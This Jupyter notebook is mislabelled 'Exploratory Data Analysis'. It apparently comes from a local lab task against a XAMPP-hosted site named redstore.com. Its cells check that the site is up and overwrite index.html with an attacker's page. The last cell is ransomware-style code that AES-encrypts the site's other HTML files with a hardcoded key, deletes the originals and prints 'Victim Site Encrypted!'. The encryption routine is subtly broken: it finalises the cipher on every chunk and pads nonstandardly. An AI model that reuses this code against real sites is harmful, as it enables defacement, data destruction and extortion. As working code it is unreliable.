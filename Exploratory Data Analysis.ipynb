{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a4fa798",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "website_url = [\n",
    "    \"http://127.0.0.1/task01/redstore.com/\" \n",
    "]\n",
    "statuses = {\n",
    "    200: \"Website Available\",\n",
    "    301: \"Permanent Redirect\",\n",
    "    302: \"Temporary Redirect\",\n",
    "    404: \"Not Found\",\n",
    "    500: \"Internal Server Error\",\n",
    "    503: \"Service Unavailable\"\n",
    "}\n",
    "for url in website_url:\n",
    "    try:\n",
    "        web_response = requests.get(url)\n",
    "        print(url, statuses[web_response.status_code])\n",
    " \n",
    "    except:\n",
    "        print(url, statuses[web_response.status_code])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "df01b7cb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import shutil\n",
    "\n",
    "def replace_index_html(attacker_directory, redstore_directory):\n",
    "    try:\n",
    "        shutil.copy2(attacker_directory + \"/index.html\", redstore_directory + \"/index.html\")\n",
    "        print(\"index.html replaced successfully!\")\n",
    "    except FileNotFoundError:\n",
    "        print(\"Source or destination directory does not exist.\")\n",
    "    except Exception as e:\n",
    "        print(f\"An error occurred: {str(e)}\")\n",
    "\n",
    "attacker_directory = 'D:\\\\XAMPP\\\\htdocs\\\\task01\\\\attacker_dir'\n",
    "redstore_directory = 'D:\\\\XAMPP\\\\htdocs\\\\task01\\\\redstore.com'\n",
    "\n",
    "replace_index_html(attacker_directory, redstore_directory)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47f3e553",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n",
    "from cryptography.hazmat.backends import default_backend\n",
    "\n",
    "def encrypt_file(file_path, key):\n",
    "    chunk_size = 64 * 1024  # 64KB\n",
    "    output_file = file_path + \".enc\"\n",
    "\n",
    "    iv = os.urandom(16)\n",
    "    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n",
    "\n",
    "    with open(file_path, 'rb') as file:\n",
    "        with open(output_file, 'wb') as output:\n",
    "            output.write(iv)\n",
    "\n",
    "            encryptor = cipher.encryptor()\n",
    "            while True:\n",
    "                chunk = file.read(chunk_size)\n",
    "                if len(chunk) == 0:\n",
    "                    break\n",
    "                elif len(chunk) % 16 != 0:\n",
    "                    chunk += b' ' * (16 - (len(chunk) % 16))\n",
    "\n",
    "                encrypted_chunk = encryptor.update(chunk) + encryptor.finalize()\n",
    "                output.write(encrypted_chunk)\n",
    "\n",
    "    os.remove(file_path)\n",
    "    os.rename(output_file, file_path)\n",
    "\n",
    "def encrypt_html_files(directory, key):\n",
    "    for root, dirs, files in os.walk(directory):\n",
    "        for file in files:\n",
    "            file_path = os.path.join(root, file)\n",
    "            if file.endswith(\".html\") and file != \"index.html\":\n",
    "                encrypt_file(file_path, key)\n",
    "\n",
    "redstore_directory = 'D:\\\\XAMPP\\\\htdocs\\\\task01\\\\redstore.com'\n",
    "encryption_key = b'ThisIsA16ByteKey'\n",
    "\n",
    "encrypt_html_files(redstore_directory, encryption_key)\n",
    "print(\"Victim Site Encrypted!\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
